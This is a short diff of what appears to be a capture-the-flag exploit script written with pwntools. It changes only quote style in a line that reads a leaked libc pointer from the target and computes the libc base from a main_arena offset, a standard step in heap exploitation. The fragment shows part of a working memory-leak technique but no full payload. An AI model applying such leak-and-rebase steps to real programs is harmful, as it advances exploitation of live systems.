@@ -77,7 +77,7 @@ if __name__ == "__main__":
     #  DEBUG([0xCD3], True)
     Raise(0x90, '3' * 0x8)
     Visit()
-    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 88 - mainArena
+    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\0")) - 88 - mainArena
     success("libc.address", libc.address)
     pause()
 
